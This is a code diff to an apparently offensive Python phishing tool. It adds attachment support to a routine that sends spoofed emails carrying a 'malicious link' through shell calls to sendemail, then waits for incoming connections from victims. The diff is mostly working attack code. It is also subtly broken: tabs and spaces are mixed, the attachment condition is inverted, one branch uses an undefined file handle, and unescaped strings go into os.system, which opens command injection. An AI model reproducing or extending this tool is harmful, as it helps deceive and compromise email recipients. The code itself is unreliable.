@@ -67,6 +67,7 @@ def setup ():
 	global smtpServer
 	global subject
 	global message
+	global attachment
 	global isCustomHTML
 	global customHTML
 	global goodByeName
@@ -81,6 +82,7 @@ def setup ():
 	targetEmail = configParser.get('Config', 'targetEmail')
 	enabledSpoofing = configParser.get('Config', 'enabledSpoofing')
 	spoofEmail  = configParser.get('Config', 'spoofEmail')
+	attachment  = configParser.get('Config', 'attachment')
 	smtpEmail    = configParser.get('Config', 'smtpEmail')
 	smtpPass = configParser.get('Config', 'smtpPass')
 	smtpGoServer = configParser.get('Config', 'smtpGoServer')
@@ -206,23 +208,36 @@ def sendMail(server, toAddr, address, username, password, subject, message, good
 			# Get the link
 			link = getLink()
 			color_print("[+] Sending email to.. " + toAddr, color='blue')
-			time.sleep(2)
+			time.sleep(1)
 			if (enabledSpoofing == 'True'): color_print("[+] Spoofing email.. " + address, color='blue')
-			time.sleep(2)
+			time.sleep(1)
 			color_print("[*] Sending malicious link..", color='yellow')
 			time.sleep(1)
+			
 			
 			# Check if the user wants to load a custom html file
 			if (isCustomHTML == 'True'):
 
 				# Only open a custom HTML file if it exists.
 				if (os.path.isfile(customHTML)):
-
-				 	color_print("[+] Loading custom HTML Message", color='green')
+					
+					color_print("[+] Loading custom HTML Message", color='green')
+                                        
 					CustomHTML = open(customHTML, 'r')
-					# Send the mail.
-					os.system("sendemail -f " + address + " -t " + toAddr + " -u " + subject + " -o message-content-type=html -o message-file=" + customHTML + " -xu " + username + " -xp " + password + " -s " + server + " -o tls=yes")		
-					listenForConnections()
+
+
+					if (os.path.isfile(attachment)==False and attachment != 'None'):
+
+						# Send the mail.
+						os.system("sendemail -f " + address + " -t " + toAddr + " -u " + subject + " -o message-content-type=html -o message-file=" + customHTML + " -xu " + username + " -xp " + password + " -s " + server + " -o tls=yes")		
+						listenForConnections()
+						CustomHTML.close()
+					else:
+						color_print("[+] Sending attachment", color='green')
+						# Send the mail
+                                                os.system("sendemail -f " + address + " -t " + toAddr + " -u " + subject + " -a " + attachment + " -o message-content-type=html -o message-file=" + customHTML + " -xu " + username + " -xp " + password + " -s " + server + " -o tls=yes")
+                                                listenForConnections()
+						CustomHTML.close()
 				else:
 					color_print("[!] Custom HTML Does not exists!!", color='red')
 					return
@@ -240,9 +255,20 @@ def sendMail(server, toAddr, address, username, password, subject, message, good
 	<br>"""+goodBye+"""</br>
 	</html>""")
 				MessageFile.close()
-				# Send the mail.
-				os.system("sendemail -f " + address + " -t " + toAddr + " -u " + subject + " -o message-content-type=html message-file=message.html " + " -xu " + username + " -xp " + password + " -s " + server + " -o tls=yes")		
-				listenForConnections()
+				
+				if (os.path.isfile(attachment)==False and attachment == 'None'):
+
+					# Send the mail.
+					os.system("sendemail -f " + address + " -t " + toAddr + " -u " + subject + " -o message-content-type=html -o message-file=" + customHTML + " -xu " + username + " -xp " + password + " -s " + server + " -o tls=yes")		
+					listenForConnections()
+					CustomHTML.close()
+				else:
+					color_print("[+] Sending attachment", color='green')
+					# Send the mail
+                                        os.system("sendemail -f " + address + " -t " + toAddr + " -u " + subject + " -a " + attachment + " -o message-content-type=html -o message-file=" + customHTML + " -xu " + username + " -xp " + password + " -s " + server + " -o tls=yes")
+                                        listenForConnections()
+					CustomHTML.close()
+
 		except KeyboardInterrupt:
 			color_print("\nThanks, Happy hacking", color='blue')
 			return
